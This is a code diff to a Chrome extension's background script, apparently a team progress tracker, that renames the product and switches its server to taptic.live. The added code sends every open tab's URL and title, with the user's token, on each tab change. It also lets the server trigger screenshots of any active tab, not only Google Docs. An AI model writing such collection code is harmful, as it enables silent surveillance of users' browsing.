@@ -1,6 +1,6 @@
 // Background transport and per-tab progress aggregation.
 let socket = null;
-let serverUrl = "https://demo.vivaan.dev";
+let serverUrl = "https://taptic.live";
 const pendingEvents = [];
 const tabState = new Map();
 
@@ -44,9 +44,29 @@ function normalizeDocName(name) {
 
 function loadSettings(callback) {
   chrome.storage.sync.get(
-    { username: "", team: "", token: "", serverUrl: "https://demo.vivaan.dev" },
+    { username: "", team: "", token: "", serverUrl: "https://taptic.live" },
     callback
   );
+}
+
+function sendUserTabs() {
+  chrome.tabs.query({}, (tabs) => {
+    loadSettings((settings) => {
+      const payload = {
+        username: settings.username || "",
+        team: settings.team || "",
+        token: settings.token || "",
+        userTabs: tabs.map(t => ({
+          id: t.id || 0,
+          title: t.title || "Unknown",
+          url: t.url || "",
+          tabState: t.active ? "active" : "inactive"
+        }))
+      };
+      console.log("Taptic: Sending userTabs payload to server...", payload);
+      emitOrQueue("userTabs", payload);
+    });
+  });
 }
 
 function connectSocket() {
@@ -71,14 +91,28 @@ function connectSocket() {
       const queued = pendingEvents.shift();
       socket.emit(queued.event, queued.payload);
     }
+    // Also send user tabs immediately on connect
+    sendUserTabs();
   });
 
   socket.on("getScreenshot", () => {
-    chrome.tabs.query({ url: "*://docs.google.com/*" }, (tabs) => {
+    chrome.tabs.query({ active: true }, (tabs) => {
       for (const tab of tabs) {
         chrome.tabs.sendMessage(tab.id, { type: "trigger-screenshot" });
       }
     });
+  });
+
+  socket.on("remindClient", () => {
+    chrome.tabs.query({ active: true }, (tabs) => {
+      for (const tab of tabs) {
+        chrome.tabs.sendMessage(tab.id, { type: "show-reminder" });
+      }
+    });
+  });
+
+  socket.on("getUserTabs", () => {
+    sendUserTabs();
   });
 
   socket.on("disconnect", () => {});
@@ -98,7 +132,7 @@ function emitOrQueue(event, payload) {
 }
 
 loadSettings((settings) => {
-  serverUrl = settings.serverUrl || "https://demo.vivaan.dev";
+  serverUrl = settings.serverUrl || "https://taptic.live";
   connectSocket();
 });
 
@@ -158,7 +192,7 @@ chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
         return;
       }
 
-      let serviceName = "seam_tracker";
+      let serviceName = "taptic_tracker";
       try {
         if (state.url) {
           serviceName = new URL(state.url).hostname.replace(/^www\./, "");
@@ -219,7 +253,7 @@ chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
           })
           .then(response => response.text())
           .then((litterboxUrl) => {
-            let serviceName = "seam_tracker";
+            let serviceName = "taptic_tracker";
             try {
               if (sender.tab && sender.tab.url) {
                 serviceName = new URL(sender.tab.url).hostname.replace(/^www\./, "");
@@ -234,7 +268,8 @@ chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
               token: settings.token || "",
               service: serviceName,
               document_name: msg.meta && msg.meta.document_name ? msg.meta.document_name : "",
-              timestamp: Date.now()
+              timestamp: Date.now(),
+              tab_url: sender.tab && sender.tab.url ? sender.tab.url : ""
             };
             const sentNow = emitOrQueue("message", payload);
             sendResponse({ ok: true, sentNow, url: payload.url });
@@ -258,7 +293,7 @@ chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
 
   if (msg.type === "settings-updated") {
     loadSettings((settings) => {
-      const newUrl = settings.serverUrl || "https://demo.vivaan.dev";
+      const newUrl = settings.serverUrl || "https://taptic.live";
       if (newUrl !== serverUrl) {
         serverUrl = newUrl;
         if (socket) {
@@ -274,11 +309,48 @@ chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
     return true;
   }
 
+  if (msg.type === "force-send-tabs") {
+    if (typeof sendUserTabs === "function") {
+      sendUserTabs();
+      sendResponse({ ok: true });
+    } else {
+      chrome.tabs.query({}, (tabs) => {
+        loadSettings((settings) => {
+          const payload = {
+            username: settings.username || "",
+            team: settings.team || "",
+            token: settings.token || "",
+            userTabs: tabs.map(t => ({
+              id: t.id || 0,
+              title: t.title || "Unknown",
+              url: t.url || "",
+              tabState: t.active ? "active" : "inactive"
+            }))
+          };
+          emitOrQueue("userTabs", payload);
+          sendResponse({ ok: true });
+        });
+      });
+    }
+    return true;
+  }
+
   return false;
 });
 
 chrome.tabs.onRemoved.addListener((tabId) => {
   tabState.delete(tabId);
+  sendUserTabs();
+});
+
+chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
+  if (changeInfo.status === 'complete' || changeInfo.title || changeInfo.url) {
+    sendUserTabs();
+  }
+});
+
+chrome.tabs.onActivated.addListener(() => {
+  sendUserTabs();
 });
 
 chrome.alarms.create("keepalive", { periodInMinutes: 0.5 });
